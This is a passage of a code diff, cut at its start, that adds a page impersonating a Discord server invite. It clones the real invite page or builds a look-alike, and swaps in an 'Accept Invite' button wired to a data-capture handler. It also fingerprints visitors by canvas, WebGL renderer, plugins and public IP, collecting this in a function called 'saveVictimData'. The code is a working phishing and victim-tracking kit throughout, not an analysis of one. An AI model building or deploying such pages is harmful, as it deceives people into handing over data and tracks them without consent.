+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Canvas Fingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Canvas Fingerprint', 4, 17);
+                
+                return canvas.toDataURL().substring(0, 100);
+            } catch (e) {
+                return 'canvas_not_supported';
+            }
+        }
+        
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'webgl_not_supported';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                };
+            } catch (e) {
+                return 'webgl_error';
+            }
+        }
+        
+        function getFontsList() {
+            const fonts = [
+                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
+                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
+                'Verdana'
+            ];
+            return fonts; // Simplified for example
+        }
+        
+        function getPluginsList() {
+            return Array.from(navigator.plugins).map(p => p.name);
+        }
+        
+        async function getIPData() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return { ip: data.ip };
+            } catch (error) {
+                return { ip: 'unknown' };
+            }
+        }
+        
+        async function saveVictimData(data) {
+            // Save to your backend/Firestore
+            console.log('💾 Saving victim data:', data);
+            
+            // Example: Send to your backend
+            try {
+                // await fetch('/api/save-victim-data', {
+                //     method: 'POST',
+                //     headers: { 'Content-Type': 'application/json' },
+                //     body: JSON.stringify(data)
+                // });
+            } catch (error) {
+                console.error('Error saving data:', error);
+            }
+        }
+        
+        // Generate exact fallback when scraping fails
+        function generateExactFallback(inviteCode) {
+            console.log('🔄 Generating exact fallback...');
+            
+            return `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #313338;
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: #f2f3f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        
+        .discord-modal {
+            width: 440px;
+            background: #2b2d31;
+            border-radius: 8px;
+            box-shadow: 0 0 0 1px rgba(32,34,37,.6), 0 2px 10px 0 rgba(0,0,0,.2);
+            overflow: hidden;
+        }
+        
+        .modal-header {
+            background: #1e1f22;
+            padding: 24px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .close-button {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: none;
+            border: none;
+            color: #b5bac1;
+            cursor: pointer;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+        
+        .server-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #5865f2;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            font-weight: 600;
+        }
+        
+        .server-name {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #fff;
+        }
+        
+        .member-count {
+            color: #b5bac1;
+            font-size: 14px;
+        }
+        
+        .modal-body {
+            padding: 24px;
+        }
+        
+        .invite-message {
+            background: #1e1f22;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(78,80,88,.6);
+        }
+        
+        .inviter-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        
+        .inviter-avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #5865f2;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .server-preview {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            background: #313338;
+            border-radius: 4px;
+            border: 1px solid rgba(78,80,88,.3);
+        }
+        
+        .preview-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            background: #5865f2;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 18px;
+        }
+        
+        .accept-button {
+            background: #5865f2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 3px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+        
+        .accept-button:hover {
+            background: #4752c4;
+        }
+    </style>
+</head>
+<body>
+    <div class="discord-modal">
+        <div class="modal-header">
+            <button class="close-button" onclick="window.closeModal()">×</button>
+            <div class="server-icon">D</div>
+            <div class="server-name">Server ${inviteCode.toUpperCase()}</div>
+            <div class="member-count">
+                <span style="display: inline-block; width: 8px; height: 8px; background: #23a55a; border-radius: 50%; margin-right: 6px;"></span>
+                12,345 Online • 67,890 Members
+            </div>
+        </div>
+        <div class="modal-body">
+            <div class="invite-message">
+                <div class="inviter-info">
+                    <div class="inviter-avatar">D</div>
+                    <div style="color: #b5bac1; font-size: 14px;">
+                        <strong style="color: #f2f3f5;">discorduser</strong> invited you to join
+                    </div>
+                </div>
+                <div class="server-preview">
+                    <div class="preview-icon">D</div>
+                    <div>
+                        <div style="font-weight: 600; font-size: 16px;">Server ${inviteCode.toUpperCase()}</div>
+                        <div style="color: #b5bac1; font-size: 14px;">67,890 members</div>
+                    </div>
+                </div>
+            </div>
+            <button class="accept-button" id="discordAcceptButton" onclick="window.captureDiscordData()">
+                Accept Invite
+            </button>
+        </div>
+    </div>
+</body>
+</html>`;
+        }
+        
+        // Main function to clone Discord invite
+        async function cloneDiscordInvite() {
+            const inviteCode = extractInviteCode(targetInvite);
+            
+            if (!inviteCode) {
+                document.getElementById('discordCloneContainer').innerHTML = generateExactFallback('invalid');
+                return;
+            }
+            
+            try {
+                // Show loading
+                document.getElementById('discordCloneContainer').innerHTML = `
+                    <div style="display: flex; justify-content: center; align-items: center; height: 100vh; background: #313338; color: #f2f3f5;">
+                        <div style="text-align: center;">
+                            <div style="font-size: 24px; margin-bottom: 16px;">Loading Discord Invite...</div>
+                            <div style="width: 40px; height: 40px; border: 3px solid #5865f2; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+                        </div>
+                    </div>
+                    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+                `;
+                
+                // Fetch real Discord page
+                const discordHTML = await fetchDiscordInvitePage(inviteCode);
+                
+                if (discordHTML) {
+                    // Extract and inject our button
+                    const modalHTML = extractInviteModal(discordHTML) || discordHTML;
+                    const finalHTML = injectCaptureButton(modalHTML);
+                    
+                    // Render the cloned content
+                    document.getElementById('discordCloneContainer').innerHTML = finalHTML;
+                    console.log('✅ Successfully cloned Discord invite');
+                } else {
+                    throw new Error('No HTML content received');
+                }
+                
+            } catch (error) {
+                console.error('❌ Cloning failed:', error);
+                document.getElementById('discordCloneContainer').innerHTML = generateExactFallback(inviteCode);
+            }
+        }
+        
+        // Start the cloning process
+        document.addEventListener('DOMContentLoaded', cloneDiscordInvite);
     </script>
 </body>
 </html>
